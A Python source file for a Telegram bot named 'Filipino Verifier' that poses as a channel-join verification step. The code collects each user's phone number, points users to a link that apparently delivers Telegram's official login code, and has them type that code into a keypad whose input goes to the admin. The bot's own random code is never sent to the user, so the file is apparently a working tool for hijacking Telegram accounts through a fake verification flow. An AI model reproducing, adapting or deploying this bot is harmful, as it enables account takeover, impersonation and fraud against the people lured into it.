import logging
import random
import asyncio
import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ChatJoinRequestHandler, filters, ContextTypes
from telegram.error import BadRequest
import sqlite3
from datetime import datetime, timedelta

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.WARNING)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '7670031793'))
CHANNEL_ID = os.getenv('CHANNEL_ID', '-1003142500879')

class FilipinoVerifier:
    def __init__(self):
        self.init_db()
        self.sessions = {}
        self.error_count = 0
        self.last_error_time = None
        
    def init_db(self):
        self.conn = sqlite3.connect('verification.db', check_same_thread=False)
        c = self.conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS pending_verifications 
                   (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                    phone_number TEXT, verification_code TEXT, entered_code TEXT,
                    timestamp DATETIME, status TEXT DEFAULT 'waiting', admin_notified BOOLEAN DEFAULT 0)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS verified_users 
                   (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                    phone_number TEXT, verified_date DATETIME)''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS pending_joins 
                   (user_id INTEGER, chat_id TEXT, chat_title TEXT, request_date DATETIME,
                    status TEXT DEFAULT 'pending', PRIMARY KEY (user_id, chat_id))''')
        
        self.conn.commit()

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.message.from_user
        
        keyboard = ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], 
                                     resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            f"Hi {user.first_name}! To join our channel, please share your contact info.",
            reply_markup=keyboard
        )
        
        c = self.conn.cursor()
        c.execute('INSERT OR REPLACE INTO pending_verifications (user_id, username, first_name, timestamp, status) VALUES (?, ?, ?, ?, ?)',
                 (user.id, user.username, user.first_name, datetime.now(), 'waiting_contact'))
        self.conn.commit()

    async def handle_join_request(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.chat_join_request.from_user
        chat = update.chat_join_request.chat
        
        c = self.conn.cursor()
        c.execute('INSERT OR REPLACE INTO pending_joins (user_id, chat_id, chat_title, request_date) VALUES (?, ?, ?, ?)',
                 (user.id, str(chat.id), chat.title, datetime.now()))
        self.conn.commit()
        
        c.execute('SELECT * FROM verified_users WHERE user_id = ?', (user.id,))
        if c.fetchone():
            await context.bot.approve_chat_join_request(chat.id, user.id)
            c.execute('UPDATE pending_joins SET status = "approved" WHERE user_id = ? AND chat_id = ?',
                     (user.id, str(chat.id)))
            self.conn.commit()
            await context.bot.send_message(user.id, "✅ Welcome back! Request approved.")
            return
        
        await self.notify_admin_once(context, f"Join request: {user.first_name} (@{user.username}) - {chat.title}")
        await context.bot.send_message(user.id, f"To join {chat.title}, complete verification first. Send /start")

    async def handle_contact(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.message.from_user
        contact = update.message.contact
        
        if contact.user_id != user.id:
            await update.message.reply_text("❌ Please share your own contact.", reply_markup=ReplyKeyboardRemove())
            return
        
        c = self.conn.cursor()
        c.execute('UPDATE pending_verifications SET phone_number = ?, status = "contact_shared" WHERE user_id = ?',
                 (contact.phone_number, user.id))
        self.conn.commit()
        
        code_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔑 Get Code", url="https://t.me/+42777")]])
        
        await update.message.reply_text(
            f"✅ Contact received: {contact.phone_number}\nClick button below to get verification code:",
            reply_markup=code_keyboard
        )
        await update.message.reply_text(".", reply_markup=ReplyKeyboardRemove())
        
        admin_keyboard = InlineKeyboardMarkup([[InlineKeyboardButton(f"Setup Code for {user.first_name}", callback_data=f"setup_{user.id}")]])
        
        await self.notify_admin_once(context, 
            f"📱 Contact shared by {user.first_name} (@{user.username})\nPhone: {contact.phone_number}\nClick to setup code:",
            admin_keyboard)

    async def handle_admin_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        
        if query.from_user.id != ADMIN_ID:
            await query.answer("Admin only")
            return
            
        await query.answer()
        
        if query.data.startswith('setup_'):
            user_id = int(query.data.split('_')[1])
            code = str(random.randint(10000, 99999))
            
            c = self.conn.cursor()
            c.execute('UPDATE pending_verifications SET verification_code = ?, status = "code_ready" WHERE user_id = ?',
                     (code, user_id))
            self.conn.commit()
            
            c.execute('SELECT first_name, phone_number FROM pending_verifications WHERE user_id = ?', (user_id,))
            user_info = c.fetchone()
            
            if user_info:
                await self.send_code_interface(context, user_id, code)
                await query.edit_message_text(
                    f"Code for {user_info[0]}: `{code}`\nSend this to: {user_info[1]}\nUser can now enter code.",
                    parse_mode='Markdown'
                )
        
        elif query.data.startswith('approve_'):
            user_id = int(query.data.split('_')[1])
            await self.approve_user(query, context, user_id, True)
            
        elif query.data.startswith('reject_'):
            user_id = int(query.data.split('_')[1])
            await self.approve_user(query, context, user_id, False)

    async def send_code_interface(self, context, user_id, code):
        keyboard = []
        for i in range(1, 10, 3):
            keyboard.append([InlineKeyboardButton(str(j), callback_data=f"n_{j}_{user_id}") for j in range(i, i+3)])
        keyboard.append([InlineKeyboardButton('0', callback_data=f'n_0_{user_id}')])
        keyboard.append([
            InlineKeyboardButton('🔙 Back', callback_data=f'back_{user_id}'),
            InlineKeyboardButton('✅ Submit', callback_data=f'submit_{user_id}')
        ])
        
        await context.bot.send_message(
            user_id,
            "🔢 Enter 5-digit code:\n\nCode: ○○○○○\nEntered: 0/5",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        self.sessions[user_id] = {'entered': '', 'correct': code}

    async def handle_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data
        
        await query.answer()
        
        if not data.endswith(f'_{user_id}') or user_id not in self.sessions:
            await query.edit_message_text("❌ Session expired. Contact support.")
            return
        
        session = self.sessions[user_id]
        
        if data.startswith(f'n_'):
            number = data.split('_')[1]
            if len(session['entered']) < 5:
                session['entered'] += number
                
            display = '●' * len(session['entered']) + '○' * (5 - len(session['entered']))
            await query.edit_message_text(
                f"🔢 Enter code:\n\nCode: {display}\nEntered: {len(session['entered'])}/5",
                reply_markup=query.message.reply_markup
            )
            
        elif data.startswith('back_'):
            if session['entered']:
                session['entered'] = session['entered'][:-1]
                display = '●' * len(session['entered']) + '○' * (5 - len(session['entered']))
                await query.edit_message_text(
                    f"🔢 Enter code:\n\nCode: {display}\nEntered: {len(session['entered'])}/5",
                    reply_markup=query.message.reply_markup
                )
                
        elif data.startswith('submit_'):
            if len(session['entered']) != 5:
                await query.edit_message_text("❌ Need 5 digits", reply_markup=query.message.reply_markup)
                return
            
            c = self.conn.cursor()
            c.execute('UPDATE pending_verifications SET entered_code = ?, status = "code_entered" WHERE user_id = ?',
                     (session['entered'], user_id))
            self.conn.commit()
            
            await self.notify_admin_for_approval(context, user_id, session['entered'], session['correct'])
            
            await query.edit_message_text(
                f"✅ Code submitted: {session['entered']}\nWaiting for admin approval..."
            )
            
            del self.sessions[user_id]

    async def notify_admin_for_approval(self, context, user_id, entered, correct):
        c = self.conn.cursor()
        c.execute('SELECT first_name, username, phone_number FROM pending_verifications WHERE user_id = ?', (user_id,))
        user_info = c.fetchone()
        
        if not user_info:
            return
            
        first_name, username, phone = user_info
        is_correct = entered == correct
        status = "✅ CORRECT" if is_correct else "❌ WRONG"
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"✅ Approve {first_name}", callback_data=f"approve_{user_id}")],
            [InlineKeyboardButton(f"❌ Reject {first_name}", callback_data=f"reject_{user_id}")]
        ])
        
        await self.notify_admin_once(context,
            f"Code entered by {first_name} (@{username})\nSent: {correct} | Entered: {entered}\nStatus: {status}",
            keyboard)

    async def approve_user(self, query, context, user_id, approved):
        c = self.conn.cursor()
        c.execute('SELECT first_name, username, phone_number FROM pending_verifications WHERE user_id = ?', (user_id,))
        user_info = c.fetchone()
        
        if not user_info:
            await query.edit_message_text("User not found")
            return
            
        first_name, username, phone = user_info
        
        if approved:
            c.execute('INSERT OR REPLACE INTO verified_users (user_id, username, first_name, phone_number, verified_date) VALUES (?, ?, ?, ?, ?)',
                     (user_id, username, first_name, phone, datetime.now()))
            c.execute('UPDATE pending_verifications SET status = "verified" WHERE user_id = ?', (user_id,))
            self.conn.commit()
            
            approved_chats = await self.approve_pending_joins(context, user_id)
            
            if approved_chats:
                chat_list = "\n".join([f"• {chat}" for chat in approved_chats])
                message = f"✅ Verification complete!\n\nAuto-approved for:\n{chat_list}"
            else:
                message = "✅ Verification complete! You can now join channels."
            
            await context.bot.send_message(user_id, message)
            await query.edit_message_text(f"✅ {first_name} verified and approved for {len(approved_chats)} channel(s)")
            
        else:
            c.execute('UPDATE pending_verifications SET status = "rejected" WHERE user_id = ?', (user_id,))
            self.conn.commit()
            await context.bot.send_message(user_id, "❌ Verification failed. Try /start again.")
            await query.edit_message_text(f"❌ {first_name} verification rejected")

    async def approve_pending_joins(self, context, user_id):
        approved = []
        c = self.conn.cursor()
        c.execute('SELECT chat_id, chat_title FROM pending_joins WHERE user_id = ? AND status = "pending"', (user_id,))
        
        for chat_id, chat_title in c.fetchall():
            try:
                chat_id_int = int(chat_id) if chat_id.lstrip('-').isdigit() else chat_id
                await context.bot.approve_chat_join_request(chat_id_int, user_id)
                c.execute('UPDATE pending_joins SET status = "approved" WHERE user_id = ? AND chat_id = ?', 
                         (user_id, chat_id))
                approved.append(chat_title)
            except Exception as e:
                logger.warning(f"Failed to approve join for {user_id}: {e}")
                
        self.conn.commit()
        return approved

    async def notify_admin_once(self, context, message, keyboard=None):
        try:
            current_time = datetime.now()
            
            if (self.last_error_time and 
                current_time - self.last_error_time < timedelta(minutes=5) and 
                self.error_count > 3):
                return
                
            await context.bot.send_message(ADMIN_ID, message, parse_mode='Markdown', reply_markup=keyboard)
            self.error_count = 0
            
        except Exception as e:
            self.error_count += 1
            self.last_error_time = current_time
            logger.error(f"Failed to notify admin: {e}")

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.message.from_user
        text = update.message.text.lower()
        
        if text == '/help':
            await update.message.reply_text(
                "🤖 FILIPINO VERIFIER\n\n/start - Begin verification\n/help - Show help\n\nProcess:\n1. Share contact\n2. Get code\n3. Enter code\n4. Get approved"
            )
            return
            
        c = self.conn.cursor()
        c.execute('SELECT status FROM pending_verifications WHERE user_id = ? AND status NOT IN ("verified", "rejected")', (user.id,))
        pending = c.fetchone()
        
        if pending:
            status = pending[0]
            if status == 'waiting_contact':
                await update.message.reply_text("Please share your contact using the button above.")
            elif status in ['contact_shared', 'code_ready']:
                await update.message.reply_text("Please wait for admin to setup your verification code.")
            elif status == 'code_entered':
                await update.message.reply_text("Code submitted. Waiting for admin approval.")
        else:
            await update.message.reply_text("Send /start to begin verification.")

    async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.message.from_user.id != ADMIN_ID:
            return
            
        c = self.conn.cursor()
        c.execute('SELECT COUNT(*) FROM verified_users')
        verified = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM pending_verifications WHERE status NOT IN ("verified", "rejected")')
        pending = c.fetchone()[0]
        
        await update.message.reply_text(f"📊 Stats:\n✅ Verified: {verified}\n⏳ Pending: {pending}")

    async def error_handler(self, update: object, context: ContextTypes.DEFAULT_TYPE):
        self.error_count += 1
        self.last_error_time = datetime.now()
        
        if self.error_count <= 3:
            logger.error(f"Error #{self.error_count}: {context.error}")
        
        if self.error_count == 1:
            try:
                await context.bot.send_message(ADMIN_ID, f"⚠️ Bot error occurred: {str(context.error)[:200]}")
            except:
                pass

def main():
    if not BOT_TOKEN:
        print("BOT_TOKEN not set!")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    verifier = FilipinoVerifier()
    
    app.add_handler(CommandHandler("start", verifier.start))
    app.add_handler(CommandHandler("help", verifier.handle_text))
    app.add_handler(CommandHandler("stats", verifier.stats))
    app.add_handler(MessageHandler(filters.CONTACT, verifier.handle_contact))
    app.add_handler(CallbackQueryHandler(verifier.handle_admin_callback, pattern=r'^(setup_|approve_|reject_)'))
    app.add_handler(CallbackQueryHandler(verifier.handle_user_callback, pattern=r'^(n_|back_|submit_)'))
    app.add_handler(ChatJoinRequestHandler(verifier.handle_join_request))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verifier.handle_text))
    app.add_error_handler(verifier.error_handler)
    
    print("Bot started...")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
